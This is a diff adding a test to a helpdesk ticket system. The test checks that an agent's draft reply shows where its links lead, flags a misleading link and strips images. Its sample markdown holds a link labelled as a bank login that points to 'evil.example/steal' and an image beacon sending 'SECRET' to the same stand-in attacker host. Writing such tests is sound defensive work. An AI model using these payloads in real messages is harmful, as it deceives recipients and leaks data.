@@ -200,6 +200,37 @@ describe("a reply by an agent under the review policy", () => {
     expect((await getTicket(manager, id)).ticket).toMatchObject({ revision, status: "open" });
     expect(smtp.messages).toHaveLength(0);
   });
+  it("shows the person who sends it where its links lead, and only for a draft", async () => {
+    await setPolicy("review");
+    const id = await ticket();
+    const revision = (await getTicket(manager, id)).ticket.revision;
+    const markdown = [
+      "Please [sign in](https://portal.example.test/login) and see",
+      "[https://bank.example/login](https://evil.example/steal?d=1).",
+      "![x](https://evil.example/p.png?d=SECRET)",
+    ].join(" ");
+    const draft = await reply(agent(), id, draftBody(revision, { markdown }));
+    const note = await reply(agent(), id, draftBody(revision, { markdown, internal: true }));
+    const { messages: conversation } = await getTicket(manager, id);
+    expect(conversation.find((entry) => entry.id === draft.id)?.links).toEqual([
+      {
+        text: "sign in",
+        url: "https://portal.example.test/login",
+        host: "portal.example.test",
+        misleading: false,
+      },
+      {
+        text: "https://bank.example/login",
+        url: "https://evil.example/steal?d=1",
+        host: "evil.example",
+        misleading: true,
+      },
+    ]);
+    // An internal note is no draft and needs no check.
+    expect(conversation.find((entry) => entry.id === note.id)?.links).toEqual([]);
+    // The image is not in the HTML either.
+    expect(conversation.find((entry) => entry.id === draft.id)?.html).not.toContain("<img");
+  });
   it("a repeated request returns the same draft, and a stale revision is a conflict", async () => {
     const id = await ticket();
     const revision = (await getTicket(manager, id)).ticket.revision;
